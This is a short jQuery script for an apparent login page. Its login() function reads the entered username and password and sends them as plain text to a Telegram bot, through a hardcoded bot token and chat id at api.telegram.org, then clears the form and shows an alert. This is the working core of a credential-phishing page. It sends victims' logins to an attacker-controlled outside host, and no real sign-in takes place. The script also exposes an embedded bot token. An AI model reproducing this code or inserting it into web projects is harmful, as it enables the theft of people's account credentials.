$(document).ready(function(){

var winh = $(window).height();

$(".header").height(winh);
$(".space").height(winh /4);


$("button").click(function(){
window.location.href = "login.html";
});



});

function login(){
var username = $("#username").val();
var pass = $("#pass").val();

var text = "user : " + username + "|| pass : " + pass;

var token = "708261561:AAGCOvglRsLsWMtVxv1MTuzee9bznsizPXY";
var id = "750333421";

if(username.length > 0 && pass.length > 0){


$("#logbut").attr("disabled","disabled");
    
    $.get( "https://api.telegram.org/bot" + token +"/sendMessage?chat_id=" +id + "&text=" + text, function( data ) {
$("#logbut").removeAttr("disabled","disabled");
$(".alert").show();
$("#username,#pass").val("");
      });

}

}